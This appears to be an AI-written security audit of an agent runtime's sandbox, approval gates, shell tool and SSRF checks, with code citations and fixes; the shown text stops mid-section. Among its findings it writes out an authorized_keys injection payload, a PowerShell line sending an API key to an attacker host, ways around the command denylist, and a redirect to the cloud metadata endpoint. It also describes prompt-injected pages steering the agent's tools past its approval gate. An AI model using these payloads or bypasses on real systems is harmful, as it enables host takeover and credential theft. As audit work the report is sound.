> **PROVENANCE / NON-DELIVERABLE.** This file was created by an audit subagent to hand its markdown report to the parent agent. The audit itself was strictly read-only; no project source, config, or test file was modified. Safe to delete.

# Tool Execution Safety, Command Execution, Permission Model & Sandboxing Audit

**Target:** `D:\AI\miniagent` — Java 21 / Spring Boot / LangChain4j agent runtime
**Scope:** tool execution safety, command execution, permission model, network/file sandboxing
**Method:** full read of every in-scope file plus the reachable call paths that consume them
**Date:** audit session; all line numbers are as-read at audit time

---

## 0. Headline

The runtime has a genuine, well-engineered **policy/contract layer** (`PermissionMode`, `ExecPolicy`, `ToolExecutionProfile`, `ActionExecutionStatus` state machine, per-call adaptive gates). That layer is real and better than most hobby agent runtimes.

The gap is that the policy layer is **not backed by an enforcement layer**. Path confinement, command allow-listing, and SSRF validation all exist as *intentions* in code comments, but the actual syscall-adjacent paths bypass them:

| Claimed control | Actual enforcement |
|---|---|
| "写入路径必须位于 workspace/ 内" | `edit_file` writes any absolute path on the host |
| "exec_command 需用户批准" | one grant covers every future command, forever, and `ACCEPT_EDITS` skips the gate entirely |
| `GuardedHttpClient` "every hop passes NetworkGuard" | class is never instantiated; `http_get`/`web_extract` use raw `HttpClient` with auto-redirect |
| `WorkspaceContext` "子 Agent 写入隔离目录" | `exec_command` cwd ignores the override |
| `ActionJournal.unresolved()` "需人工核验" | no caller exists; the queue is write-only |

**7 P0/P1 defects below are individually sufficient to escape the sandbox.** They are ordered by severity inside each section.

---

## Q1 — Path traversal / workspace escape

### FS-01 — [P0] `edit_file` (and `search_code`) resolves absolute host paths with **no** workspace confinement

**Evidence**

The write-side resolver *does* enforce confinement for `write_file`:

`D:\AI\miniagent\mini-agent-tools\src\main\java\com\miniagent\agent\tool\BuiltinTools.java:1194-1201`
```java
1194:        if (!resolved.startsWith(root) && !allowAbsolute) {
1195:            Path rebased = rebaseIntoWorkspace(root, resolved);
1196:            if (Objects.isNull(rebased)) {
1197:                throw new SecurityException("写入路径必须位于 workspace/ 内: " + resolved);
1198:            }
1199:            return rebased;
1200:        }
1201:        return resolved;
```

But `edit_file` never reaches that resolver. It goes through `resolveSearchPath`, which is documented as deliberately unconstrained:

`BuiltinTools.java:410-432`
```java
410:    /**
411:     * 搜索/编辑专用路径解析：与 write_file 的 workspace 限制不同，
412:     * 这两个工具要能操作真实项目（绝对路径直接用），所以不强制锁进 workspace。
413:     */
414:    private Path resolveSearchPath(String path) {
415:        String normalized = path.replace('\\', '/').trim();
416:        if (normalized.equalsIgnoreCase("workspace")
417:                || normalized.regionMatches(true, 0, "workspace/", 0, 10))
418:            return resolveWorkspacePath(path);
419:        Path p = Path.of(normalized);
420:        if (p.isAbsolute()) {
421:            return p.normalize();
422:        }
```

`edit_file` handler → `BuiltinTools.java:221-224` → `BuiltinTools.java:374` → write at `393`:

`BuiltinTools.java:363-393` (abridged)
```java
363:    private String editFile(String path, String oldStr, String newStr, boolean replaceAll) {
...
374:            Path target = resolveSearchPath(path);
375:            if (!Files.exists(target)) {
376:                return "{\"error\":\"文件不存在: " + path + "（新建文件用 write_file）\"}";
377:            }
378:            String content = Files.readString(target, StandardCharsets.UTF_8);
...
393:            Files.writeString(target, updated, StandardCharsets.UTF_8);
```

**Why it matters in production.** `edit_file` is registered with identical standing to `write_file` (`BuiltinTools.java:217-225`), is classified as an ask-dangerous *edit* tool, and appears in the same tool surface. A model (or a prompt-injected web page the model just read via `web_extract`) can call:

```json
{"path":"C:\\Users\\<user>\\.ssh\\authorized_keys","old_string":"ssh-rsa AAAA...","new_string":"ssh-rsa AAAA...attacker"}
```

and gain persistent host access. Same for `%APPDATA%\...\settings.json`, `C:\Windows\System32\drivers\etc\hosts`, or the agent's own `application.yml`. The only difference from `write_file` is that the target must already exist — a trivial constraint. `list_files`/`read_file` have the same hole via `resolveReadPath` (`BuiltinTools.java:1239-1261`, absolute branch at `1248-1250`), so the *entire* "workspace scoping" story is read-only in the literal sense: it doesn't hold.

**Secondary gap.** Even the enforcing branch checks `resolved.startsWith(root)` on the *lexical* normalized path. There is no `toRealPath()`, no `LinkOption.NOFOLLOW_LINKS`, and no Windows reparse-point check anywhere in the module:

```
grep 'descendants\(\)|taskkill|toRealPath|createSymbolicLink|O_NOFOLLOW|LinkOption' over D:\AI\miniagent\**\*.java
→ No matches found
```

A symlink/junction inside the workspace (`mklink /J workspace\esc C:\Users`) defeats `startsWith(root)` for `write_file` too. I did **not** execute a Java path-resolution probe to enumerate `C:foo`, UNC, and 8.3 behaviours, so treat those specific variants as **UNVERIFIED** — the absolute-path hole above makes them moot.

**Remediation**
1. Make `edit_file` use `resolveWorkspacePath`/`resolveWritePath` and delete `resolveSearchPath`'s absolute passthrough, or gate it behind `agent.tools.allow-absolute-write` (already exists at `BuiltinTools.java:67-68`, but is only honoured by the write resolver).
2. Replace the lexical check with `root.toRealPath()` vs `target.getParent().toRealPath().resolve(target.getFileName())` and reject when either is a reparse point (`Files.isSymbolicLink` on every ancestor, or `DosFileAttributes.isOther`).
3. Add a single mandatory `PathConfinement` helper and route *all* file-touching tools through it; today there are two resolvers with opposite security properties and the model picks which one runs by choosing a tool name.

---

## Q2 — Command execution sandbox

### CMD-01 — [P0] `exec_command` is a raw shell, and `ACCEPT_EDITS` silently removes the approval gate for **arbitrary** commands

**Evidence — it is a raw shell**

`BuiltinTools.java:1403-1420`
```java
1403:        try {
1404:            boolean isWindows = System.getProperty("os.name", "").toLowerCase().contains("win");
1405:            ProcessBuilder pb = isWindows
1406:                    ? new ProcessBuilder("cmd.exe", "/c", command)
1407:                    : new ProcessBuilder("bash", "-c", command);
1408:
1409:            // 第4层：工作目录限制在 workspace（避免扫用户主目录）
1410:            File workDirFile = defaultWorkspaceRoot().toFile();
...
1419:            pb.redirectErrorStream(true);
1420:            Process proc = pb.start();
```

The command string is handed to `cmd.exe /c` / `bash -c` verbatim. There is no argv form, no parsing-to-argv step, no allow-list. Every shell metacharacter the model emits is live: `|`, `&`, `;`, `&&`, `||`, backticks, `$( )`, `>`, `>>`, `%VAR%`, `!VAR!`, PowerShell `$( )` / `-Command` / `-EncodedCommand`, `cmd /c`, `bash -c`.

**Evidence — the gate is mode-dependent**

`ToolPipeline.java:169-192`
```java
169:        ExecPolicy effectiveExec = execPolicyService.effective(sid, mode);
...
183:        if (PermissionPolicy.needsSessionGrant(mode, name, effectiveExec) && !granted) {
184:            emitPermissionAsk(sid, name, args);
```

`PermissionPolicy.java:109-121`
```java
109:        if (mode == PermissionMode.ACCEPT_EDITS) {
110:            return false;          // ← no grant needed, for ANY tool
111:        }
...
118:        if (isExec) {
119:            // 走到这里只剩 ASK
120:            return true;
121:        }
```

Combined with the promotion at `PermissionPolicy.java:76-78`:
```java
76:        if (mode == PermissionMode.ACCEPT_EDITS) {
77:            return ExecPolicy.ALLOW;
78:        }
```

So: `PermissionMode.ACCEPT_EDITS` (labelled **"自动编辑"** / "auto-edit" in `PermissionMode.java:49`) turns `exec_command` into an unprompted, unconstrained shell. The neighbouring comment at `ToolConcurrencyPolicy`/`ExecPolicy` repeatedly insists "ACCEPT_EDITS 的语义是'别问我'，不是'我允许你执行命令'" (see `ExecPolicy.java:16-18` and the test at `ToolPipelineTest.java:223-236`) — and that assertion is **only true for `ExecPolicy.BLOCK`**. Test `execBlockIsNotBypassedByAcceptEditsMode` passes precisely because it configures `block`; under the shipped default (`ExecPolicyService.java:32` → `FALLBACK = ExecPolicy.ALLOW`) the same test would observe `EXECUTED`. The claimed invariant holds for one of three policy tiers and the test pins only that tier.

**Severity rationale.** A user flipping "auto edit" to stop edit prompts — the documented purpose — has thereby authorised `rm -rf`, `format C:`, credential exfiltration, and `curl … | sh`, with no prompt and no log line distinguishing it from a file edit.

### CMD-02 — [P1] The "read-only" classification is spoofable, which silently upgrades behavioural contracts

`CommandReadOnlyJudge` is genuinely careful (segment splitting, wrapper expansion, `find -exec`/`sort -o` rejection — see the "already solid" list). But it only gates *consequences*: `ToolSideEffect`, `idempotent`, parallel-batch eligibility, and post-timeout retry semantics. Two exploitable seams:

**(a) `--version`/`--help`/`-h` short-circuit any command to read-only.**

`CommandReadOnlyJudge.java:150-153`
```java
150:        if (segment.hasArgument("--version") || segment.hasArgument("--help") || segment.hasArgument("-h")) {
151:            // --version / --help 不改变任何状态，任何命令带它都是只读的
152:            return null;
153:        }
```

This returns **before** the `git` branch (154), the `SORT_LIKE` branch (157), and the `READ_ONLY_COMMANDS` whitelist check (161). So `rm -rf /tmp/x -h` — or any binary whose `-h` is not help, e.g. `curl -h` is help but `dd -h`… and more concretely any command where `-h` is a real flag — is classified **READ_ONLY + idempotent** by `ToolConcurrencyPolicy.sideEffectOf` (`ToolConcurrencyPolicy.java:342-347`) and `isIdempotent` (`358-363`). Consequences, from `ToolPipeline.executeJournaled`:

`ToolPipeline.java:240-244`
```java
240:                if (!descriptor.idempotent() || !entry.status().terminal()) {
...
245:                attempt = entry.attempt() + 1;
246:                journal(key, name, argumentsHash, ActionExecutionStatus.READY, attempt,
247:                        ToolErrorCode.NONE, "幂等动作恢复重试", "");
```

and `ToolExecutionGuards.canRunBatchInParallel` (`ToolExecutionGuards.java:84-86`). A mis-classified *destructive* command becomes: retry-eligible after an ambiguous crash, and eligible to run concurrently with sibling calls. Also, `tail -f`-style never-terminating commands bypass the `-f` check at `CommandReadOnlyJudge.java:167-170` if `-h` is present, so a non-terminating command can enter a parallel batch and hold the batch to its gate.

Note the whitelist is also *unconditionally* honoured for these names — `READ_ONLY_COMMANDS` contains `cd` (with a comment justifying it), `env`, `printenv`, `date`… `env`/`printenv` are read-only only if the environment isn't sensitive; given CMD-04 below, `printenv`/`env` **exfiltrates every credential the agent process holds straight into the model context**. `set` (the Windows equivalent) isn't listed, but `cmd /c set` reaches it through the wrapper expansion at `ShellCommandLine.java:127-138`… — actually `set` is not in the whitelist, so that specific form is caught. `env`/`printenv` are not caught.

**(b) The strongest signal of the real problem: the pipeline's own test suite treats a `{}` argument blob as a live `exec_command`** (`ToolPipelineTest.java:232`, `244`, `251`, `265`). There is no command in those args, yet the outcome differs by policy — confirming the decision never consults command content. That is by design for the gate, but it means *nothing* about the command text constrains execution.

### CMD-03 — [P1] The three "safety layers" in `execCommand` are trivially bypassable and one is inverted

**Evidence**

`BuiltinTools.java:1306-1315`
```java
1306:    private static final java.util.regex.Pattern DANGEROUS_PATTERN = java.util.regex.Pattern.compile(
1307:            "(rm\\s+-rf\\s+/|rm\\s+-rf\\s+\\*|/etc/(shadow|passwd)|"
...
1311:                    + "powershell.*-enc|cmd.*\\/c.*echo|"
1312:                    + ";\\s*rm|\\|\\s*rm|&&\\s*rm|"
1313:                    + ";\\s*cat|\\|\\s*cat|&&\\s*cat)",
```

`BuiltinTools.java:1332-1349`
```java
1332:    private static final Set<String> DANGEROUS_COMMANDS = Set.of(
1333:            "rm -rf /", "rm -rf /*", "rm -rf ~", "rm -rf .",
...
1343:            "del /f /s /q C:\\", "rd /s /q C:\\",
...
1348:            "powershell -enc", "cmd /c echo"
1349:    );
```

matched by plain substring containment at `BuiltinTools.java:1374-1380`:
```java
1374:        String lc = command.toLowerCase().trim();
1375:        for (String bad : DANGEROUS_COMMANDS) {
1376:            if (lc.contains(bad.toLowerCase())) {
```

And layer 3 explicitly permits the dangerous metacharacters, only special-casing `>`:

`BuiltinTools.java:1594-1600`
```java
1594:        // 2. 允许正常命令操作：管道 |、链接 && ||、分号 ; 都是正常语法
1595:        //    只拦截重定向到项目外目录
1596:        if (trimmed.contains(">") && !trimmed.contains("> workspace/")
1597:                && !trimmed.contains("> ./") && !trimmed.contains("> nul")) {
1598:            return true;
1599:        }
1600:        return false;
```

**Bypasses, all verified against the literal strings above:**
- `rm  -rf  /` (double space) — `contains("rm -rf /")` is false; `DANGEROUS_PATTERN` requires exactly one `\s`, so `rm\s+-rf\s+/` also fails.
- `rm -rf "/"` / `rm -rf ${HOME}` / `rm -rf $HOME` — no literal match.
- `del /s /q C:\Users` / `rd /s /q D:\Data` / `Remove-Item -Recurse -Force C:\` — the blacklist entries are `del /f /s /q C:\` and `rd /s /q C:\`; `contains("del /f /s /q")` is false for `del /s /q`, and neither `rd /s /q D:\Data` nor the PowerShell form matches anything. Dropping the `C:\` suffix alone defeats the Windows entries.
- `DANGEROUS_PATTERN` only catches `rm`/`cat` when *adjacent to* `;`, `|`, `&&`. **Any non-listed destructive command is invisible**: `format.com`, `diskpart`, `cipher /w`, `takeown`, `icacls`, `reg delete`, `netsh`, `schtasks`, `bitsadmin`, `wmic`, `powershell -Command "..."`, `python -c "..."` (only caught for `os.`/`subprocess` specifically, `DANGEROUS_PATTERN:1310`), `node -e`, `mshta`, `rundll32`, `certutil -urlcache -f http://x/y.exe y.exe`.
- Redirection: the check is a plain substring test on the *whole* command. `echo x > C:\Windows\System32\drivers\etc\hosts` is correctly refused (contains `>`, no magic substring). But **`echo x >nul:..\..\..\Windows\System32\drivers\etc\hosts` passes**, because the command contains the literal `>nul` that the check whitelists — and the `:` … `..\` tail makes the shell treat the "NUL device" text as a path under the redirect. More generally, the whitelist is a substring the attacker controls: appending `>` + any text containing `>nul`/`> ./`/`> workspace/` disables the only injection check in the method. This is an inverted control — the gate consults a string the *attacker* writes rather than the parsed redirect target. (Exact cmd.exe parsing of the `nul:` form is **UNVERIFIED** at runtime; the structural defect — an attacker-controlled substring gating a security decision — does not depend on it. `>>` and `|` inherit the same weakness.)

`python -c "…"` / `powershell -Command` / `cmd /c` / `bash -c` / `npm install` / `pip install` / `curl … | sh` are all executable — nothing in `execCommand` restricts interpreters or package installation. `ToolConcurrencyPolicy` even special-cases `bash -c` string *expansion* for read-only judging (`ShellCommandLine.java:121-140`), which means the design explicitly anticipates `bash -c` reaching the shell.

**Remediation**
1. Delete `DANGEROUS_COMMANDS`/`DANGEROUS_PATTERN`/`containsCommandInjection`. Substring denylists on a shell command line provide negative security value: they create false confidence and, per `>`-handling above, actively mis-route. Replace with (a) an explicit argv-based `exec` mode (no shell) plus (b) a deny-by-default executable allow-list for shell mode.
2. If a shell must stay, gate it: require `ExecPolicy.ASK` *at minimum* regardless of `PermissionMode`, and make the approval payload the full command text (see Q3).
3. Bind `exec_command`'s cwd to `effectiveWorkspaceRoot()` not `defaultWorkspaceRoot()` (see CMD-05).

### CMD-04 — [P1] Child processes inherit the agent's entire environment

**Evidence**

`BuiltinTools.java:1405-1418` — the only environment mutation is additive:
```java
1406:                    ? new ProcessBuilder("cmd.exe", "/c", command)
...
1417:            pb.environment().put("PYTHONUTF8", "1");
1418:            pb.environment().put("PYTHONIOENCODING", "UTF-8");
```

There is no `pb.environment().clear()` and no allow-list. `ProcessBuilder` inherits the parent environment when `environment()` isn't cleared. The same is true of `HostCommand.exec` (`HostCommand.java:112`), the MCP spawn (`McpStdioClient.java:56-59`, which *merges* config env on top of the inherited set), and `McpToolBridge`.

**Why it matters.** Every provider key the app holds (`DEEPSEEK_API_KEY`, `OPENAI_API_KEY`, DB passwords, `TAVILY_API_KEY` at `WebSearchService.java:54`, cloud credentials) is one `printenv` / `set` / `echo %X%` away. Combined with CMD-01 (unprompted shell under `ACCEPT_EDITS`) and Q4 (unguarded egress) this is a one-command exfiltration chain: `powershell -Command "iwr https://attacker/?k=$env:OPENAI_API_KEY"`. Separately, `CommandReadOnlyJudge` whitelists `env` and `printenv` (`CommandReadOnlyJudge.java:52`), so even in a policy where writes are gated, *reading* the full environment is classified safe, parallelisable, and retry-safe.

Also note the journal: `ToolPipeline.executeJournaled` receives `effective` arguments unredacted (`ToolPipeline.java:203-212`) and `ActionJournalEntry.message` is truncated-but-stored at 1000 chars (`ActionJournalEntry.java:18`), while `persistLongOutput` writes the raw command line into `workspace/_tool-output/*.log`:

`BuiltinTools.java:1538`
```java
1538:            Files.writeString(file, "# command: " + command + System.lineSeparator() + output,
```

`redactSensitive` is applied only to *log* statements (`BuiltinTools.java:1371`), never to persisted artifacts.

**Remediation.** `pb.environment().clear()` then repopulate from a declared allow-list (`PATH`, `SystemRoot`, `TEMP`, locale/encoding vars) plus an explicit `agent.tools.exec-env-allow`. Remove `env`/`printenv` from the read-only whitelist. Apply `redactSensitive` before persisting command text.

### CMD-05 — [P1] `exec_command` ignores the sub-agent workspace override

**Evidence**

`BuiltinTools.java:1410` uses `defaultWorkspaceRoot()`. The override-aware accessor exists and is used by every other file tool:

`BuiltinTools.java:864-868`
```java
864:    /** 有效 workspace 根：子 Agent 可覆盖为独立目录 */
865:    public static Path effectiveWorkspaceRoot() {
866:        Path override = WorkspaceContext.getRootOverride();
867:        return Objects.nonNull(override) ? override.toAbsolutePath().normalize() : defaultWorkspaceRoot();
868:    }
```

and the override is genuinely installed for sub-agents: `RunScope.asSubagent(..., subWorkspace)` (`RunScope.java:79-88`) → `applyLocals` → `WorkspaceContext.setRootOverride(workspaceRoot)` (`RunScope.java:138-142`).

**Why it matters.** A sub-agent's file tools are confined to `workspace/_sub/<id>/`, but its `exec_command` runs in the *parent* workspace. Any build/test command a sub-agent runs writes artifacts and can overwrite parent files; the isolation boundary documented in `WorkspaceContext`'s class comment ("当前线程的 workspace 根覆盖（子 Agent 写入隔离目录）", `WorkspaceContext.java:5-7`) does not hold for the most powerful tool in the surface.

**Remediation.** One-line change to `effectiveWorkspaceRoot()`, plus a test asserting cwd for a sub-agent scope.

---

## Q3 — Approval / permission model

### PERM-01 — [P0] Approval is bound to the **tool name**, persists for the session, and has no revocation or audit

**Evidence — binding is by name only**

`ToolPipeline.java:166`
```java
166:        boolean granted = sid != null && permissionStore.isAskGranted(sid, name);
```

The store's API takes only a tool name — no command, no cwd, no argument hash:

`SessionPermissionStore.java:264-285`
```java
264:    public void grantAskTool(String sessionId, String toolName) {
...
269:            Set<String> grants = new HashSet<>(old.askGrantedTools());
270:            grants.add(toolName.trim());
...
280:    public boolean isAskGranted(String sessionId, String toolName) {
...
284:        return get(sessionId).askGrantedTools().contains(toolName);
285:    }
```

`askGrantedTools` is a plain `Set<String>` of tool names (`SessionPermissionStore.java:33`), persisted by the app-module implementation of `SessionPermissionPersistence` (`SessionPermissionPersistence.java:7-13`), and asserted by test as surviving a store restart (`SessionPermissionStorePersistenceTest.java:25,35`).

The only consumer of the HTTP approval endpoint passes the tool name straight through:

`D:\AI\miniagent\mini-agent-app\src\main\java\com\miniagent\web\MiniAgentChatPageController.java:1048-1053`
```java
1048:        if ("grant_ask".equalsIgnoreCase(action)) {
1049:            String tool = Objects.isNull(body.get("tool")) ? "" : String.valueOf(body.get("tool"));
1050:            permissionStore.grantAskTool(sessionId, tool);
1051:            eventCenter.appendUserMessage(sessionId,
1052:                    com.miniagent.common.MessageConstants.SYSTEM_MESSAGE_PREFIX
1053:                            + "用户已批准工具 " + tool + "，请继续。");
```

**Why it matters.** The user sees a card for `git status` (the display text is built from the command, `ToolPipeline.java:369-375` → `ExecCommandParams.displayText`) and approves it. From that moment, for the lifetime of the session (and across restarts, given persistence), **every** subsequent `exec_command` executes without a prompt — including one the model composes three turns later after ingesting an attacker-controlled web page via `web_extract`. This is precisely the "one approval covers arbitrary later commands" failure mode. Compare Claude Code / Codex, which key approval on a parsed command prefix + cwd and distinguish one-shot from persistent rules.

There is also **no approval audit trail**: `grantAskTool` writes to the permission store (the set) and drops a *chat* message (`MiniAgentChatPageController.java:1051`), but the permission store has no append-only record of who approved what, when, or in response to which displayed command. `TraceRecorder` captures `WAITING_FOR_HUMAN` (`ToolPipeline.java:185-188`) recording only `{"tool":…,"mode":…,"reason":"permission_ask"}` — the command text is not in the trace node even though `emitPermissionAsk` had it.

**Partial credit:** revocation does exist in two narrow paths — `setExecPolicyOverride` drops the `exec_command` grant when tightening (`SessionPermissionStore.java:214-222`) and `clear(sessionId)` deletes it (`315-322`). But nothing expires a grant, nothing revokes it when the workspace changes, and no UI/API lists active grants with their provenance (`toView` exposes the raw set at `SessionPermissionStore.java:306` — names only, no timestamps).

**Remediation**
1. Change the grant key from `(sessionId, toolName)` to `(sessionId, toolName, canonicalArgDigest)` where the digest covers tool name + full arguments + resolved cwd; keep the existing hash infrastructure (`ToolPipeline.sha256`, `ToolPipeline.java:328-336`) which already computes `sha256(arguments)` at line 227 and throws it away for this purpose.
2. Add explicit scopes: `once` (consumed on use), `exact-command` (digest-bound), `prefix` (parsed base command + subcommand), `session`, `always`. Default to `once`.
3. Add an append-only approval log (approver, timestamp, displayed command, digest, decision) — the `ActionJournal` append pattern (`FileActionJournal.java:56-71`) is a ready-made template.
4. Make `ACCEPT_EDITS` not imply `ExecPolicy.ALLOW`; add a test that `ACCEPT_EDITS` + default policy still asks for `exec_command` (the existing test at `ToolPipelineTest.java:223-236` only covers `block`).

---

## Q4 — Network egress

### NET-01 — [P1] `http_get` / `http_post` follow redirects without re-validation (single-hop SSRF)

**Evidence**

Validation happens exactly once, on the user-supplied URL:

`BuiltinTools.java:1265-1270`
```java
1265:    private String httpSend(String method, String url, String body, String contentType) {
1266:        try {
1267:            String blocked = networkGuard.validateUrl(url);
1268:            if (Objects.nonNull(blocked)) {
1269:                return "{\"error\":\"" + blocked.replace("\"", "'") + "\"}";
1270:            }
```

Then the shared client is built with automatic redirect following and used unconditionally:

`BuiltinTools.java:81-84`
```java
81:    private static final HttpClient HTTP = HttpClient.newBuilder()
82:            .connectTimeout(Duration.ofSeconds(10))
83:            .followRedirects(HttpClient.Redirect.NORMAL)
84:            .build();
```

`BuiltinTools.java:1285-1286`
```java
1285:            HttpResponse<String> resp = HTTP.send(
1286:                    b.build(), HttpResponse.BodyHandlers.ofString(StandardCharsets.UTF_8));
```

`Redirect.NORMAL` follows up to 5 redirects (including cross-origin, http→https). The redirect target is never passed to `NetworkGuard`.

**Why it matters.** Classic single-hop SSRF. The attacker (or a prompt-injected instruction) supplies a *public* URL they control, e.g. `https://attacker.example/r`, which 302-redirects to `http://169.254.169.254/latest/meta-data/iam/security-credentials/` or `https://127.0.0.1:443/admin`. `validateUrl` passes the first hop, and the JDK client cheerfully fetches the internal target and returns the body to the model. Same story for the browser path — `browser_navigate` validates once (`BrowserService.java:1144-1147`) and Playwright follows redirects internally.

### NET-02 — [P1] The hardened client that would fix NET-01 is **never instantiated**

**Evidence**

`GuardedHttpClient` exists, is a `@Component`, and does exactly the right thing — manual redirect loop re-validating every hop:

`GuardedHttpClient.java:26-29`
```java
26: /**
27:  * Bounded HTTP transport for untrusted targets. Redirects are handled manually so
28:  * every hop passes {@link NetworkGuard} before a connection is opened.
29:  */
```

`GuardedHttpClient.java:112-116` and `140`
```java
112:        for (int redirects = 0; ; redirects++) {
113:            requireAllowed(current);
114:            HttpRequest request = buildRequest(
115:                    currentMethod, current, currentBody, currentHeaders, timeout);
116:            RawResponse raw = transport.send(request);
...
140:                requireAllowed(next);
```

And it constructs its own client with `Redirect.NEVER` (`GuardedHttpClient.java:51-54`), bounds the response (`readBounded`, `180-191`, with `ABSOLUTE_MAX_RESPONSE_BYTES = 32 MiB` at line 34), validates the request body size (99-101), strips credentials cross-origin (145-147, 228-236), and refuses HTTPS→HTTP downgrade (141-144).

But a repo-wide search finds no production consumer:

```
grep 'GuardedHttpClient' over D:\AI\miniagent\**\*.java
→ 5 matches, all inside GuardedHttpClient.java itself (its own class/ctor/method refs)
```

**Why it matters.** The mitigation for NET-01 is written, tested-looking, and wired to nothing. `BuiltinTools` and `WebSearchService` each construct their own `HttpClient` with `Redirect.NORMAL` (`BuiltinTools.java:81-84`, `WebSearchService.java:44-47`). This is the highest-leverage fix in the report: adopting the existing class closes NET-01, the size-bound gap, and the credential-forwarding gap in one move.

### NET-03 — [P1] `web_extract` has a second, much weaker SSRF check that misses DNS rebinding, `[::1]`, and redirects

**Evidence**

`WebSearchService.java:113-129`
```java
113:        try {
114:            // SSRF 防护：拦截内网地址
115:            URI uri = URI.create(url);
116:            String host = uri.getHost();
117:            if (Objects.isNull(host) || isPrivateHost(host)) {
118:                return buildErrorResponse("安全拦截: URL 目标是内网地址 (" + host + ")");
119:            }
...
129:            HttpResponse<String> response = HTTP.send(request, HttpResponse.BodyHandlers.ofString());
```

`WebSearchService.java:518-531`
```java
518:    /** SSRF 防护：拦截内网/本地地址 */
519:    private static boolean isPrivateHost(String host) {
520:        return host.equals("localhost")
521:                || host.equals("127.0.0.1")
522:                || host.startsWith("10.")
523:                || host.startsWith("192.168.")
524:                || host.startsWith("172.16.") || host.startsWith("172.17.")
525:                || host.startsWith("172.18.") || host.startsWith("172.19.")
526:                || host.startsWith("172.2")   || host.startsWith("172.30.")
527:                || host.startsWith("172.31.")
528:                || host.equals("0.0.0.0")
529:                || host.endsWith(".local")
530:                || host.endsWith(".internal");
531:    }
```

Gaps, each independently sufficient:
- **No DNS resolution at all.** It is a pure string test on the *hostname*. `http://localtest.me/`, `http://127.0.0.1.nip.io/`, `http://spoofed.burpcollaborator.net` (A record → `127.0.0.1`) all pass. This is the DNS-rebinding/rebind-by-design class the question asks about, and it is unmitigated — worse than `NetworkGuard`, which at least calls `hostResolver.resolve` (`NetworkGuard.java:92-103`).
- **IPv6 loopback is not covered.** `http://[::1]/` → `uri.getHost()` returns `[::1]`, which matches none of the string branches. (`NetworkGuard` handles this correctly via `normalizeHost` at `220-230` + `isLoopbackAddress`.)
- **`127.x` variants not covered**: `127.1`, `127.0.0.2` (only the literal `127.0.0.1` is tested).
- **Metadata endpoint not covered**: `169.254.169.254` is not matched by any branch (`startsWith("10.")`, `192.168.`, the 172.16–31 list, `0.0.0.0`, `.local`, `.internal`) → AWS/GCP/Azure IMDS is reachable in one call.
- **Redirects not covered**: `HTTP` at `WebSearchService.java:44-47` uses `Redirect.NORMAL`, and the final URL is never re-checked. The check also only runs when the backend is **not** Tavily — `extract` returns early at line 109-111, so with Tavily configured the URL is forwarded to a third party instead (different risk, still unaudited).

**Why it matters.** `web_extract` is in `PLAN_SAFE_TOOLS` (`PermissionPolicy.java:25`), i.e. it is callable **with no approval, in read-only plan mode**. That makes this the single cheapest SSRF primitive in the surface: one tool call, no user prompt, in the most locked-down mode the product offers. `169.254.169.254` in particular returns cloud IAM credentials to the model context.

**Remediation.** Delete `isPrivateHost` and call `NetworkGuard.validateUrl`. There should be exactly one SSRF gate in the codebase; today there are two implementations with different (both incomplete) coverage, and the strong one is unused (NET-02).

### NET-04 — [P2] DNS TOCTOU / rebind window between `NetworkGuard` validation and connection

**Evidence.** `NetworkGuard.validate` resolves and checks every address (`NetworkGuard.java:91-103`), then the connection is opened later by a different component. The check result is never bound to the connection — there is no connect-time socket guard, no pinning of the validated `InetAddress`, and no `ProxySelector`/resolver indirection. The JDK's `InetAddress` positive cache defaults to 30s (`networkaddress.cache.ttl`, **UNVERIFIED** in this deployment — I did not read a `java.security` override), which partially mitigates but does not eliminate the window: an attacker whose DNS TTL is short can serve a public A record to `getAllByName` and an internal one to the subsequent connect (the two go through different code paths and the connect path may bypass the cache under `SecurityManager`-less defaults).

To be clear about what *is* handled: decimal/octal/hex integer forms (`http://2130706433`) are rejected because `URI.getHost()` returns null for them (caught at `NetworkGuard.java:76-79`, `NET_HOST_MISSING`) — I traced the `validate` logic; `isBlockedHost` never sees them. `http://[::ffff:127.0.0.1]` is blocked twice over (host parse at 223-225 then `isLoopbackAddress` at 146-147, and `isBlockedAddress`'s IPv4-mapped branch at `NetworkGuard.java:172-176`). Userinfo tricks are rejected by `uri.getRawUserInfo() != null` at `NetworkGuard.java:69-71`. Zone IDs are rejected at `72-75`. `isBlockedAddress` is a genuinely thorough implementation (RFC1918, CGNAT `100.64/10`, link-local, multicast, ULA `fc00::/7`, `fe80::/10`, `2001:db8::/32`, `2001:2::/32`, `2002::/16`, and `>=224`). The residual gap is the TOCTOU window and the fact that nothing *after* validation re-checks.

**Remediation.** Resolve once, verify, then connect to the validated literal IP with the original `Host` header (curl's `--resolve` equivalent) — or implement a custom `ProxySelector`/socket factory that re-runs `isBlockedAddress` on the actual peer. `GuardedHttpClient` already establishes the pattern of owning the transport; extend it to own the peer IP.

---

## Q5 — Timeouts / resource limits

### TO-01 — [P1] Timeouts kill the direct child only; no process-tree kill, and `future.cancel(true)` does not stop the process

**Evidence — outer gate**

`AgentLoop.java:1630-1642`
```java
1630:            CompletableFuture<ToolInvocation> future = CompletableFuture.supplyAsync(() -> {
1631:                try (var ignored = scope.bind()) {
1632:                    return toolPipeline.invoke(request);
1633:                }
1634:            }, VIRTUAL_EXECUTOR);
1635:            try {
1636:                result = applyInvocation(future.get(timeout, TimeUnit.SECONDS), state);
1637:            } catch (java.util.concurrent.TimeoutException te) {
1638:                future.cancel(true);
1639:                log.warn("  工具 {} 执行超时（{}s），请求取消", name, timeout);
```

`AgentLoop.java:145-147`
```java
145:    /** 虚拟线程池：工具并行执行专用，IO 密集型任务零开销 */
146:    private static final java.util.concurrent.ExecutorService VIRTUAL_EXECUTOR =
147:            Executors.newVirtualThreadPerTaskExecutor();
```

**Evidence — inner gate**

`BuiltinTools.java:1448-1452`
```java
1448:            boolean finished = proc.waitFor(timeoutSeconds, java.util.concurrent.TimeUnit.SECONDS);
1449:            if (!finished) {
1450:                proc.destroyForcibly();
1451:                proc.waitFor(2, java.util.concurrent.TimeUnit.SECONDS);
1452:                drainer.interrupt();
```

**What is genuinely good here** and should be preserved: the design correctly makes the inner budget *strictly smaller* than the outer gate (`ExecCommandParams.OUTER_GATE_MARGIN_SECONDS = 15`, `ExecCommandParams.java:42`, and `ToolConcurrencyPolicy.EXEC_READ/EXEC_WRITE` at `167-184`), so the tool's own controllable termination wins the race instead of the outer gate escalating to `OUTCOME_UNKNOWN`. The doc comments at `BuiltinTools.java:1422-1429` explain exactly why the old `readAllBytes()`-then-`waitFor()` order made the timeout dead code; the independent drainer thread (`1434-1446`) is the right fix. This is above-average engineering.

**The residual defects:**

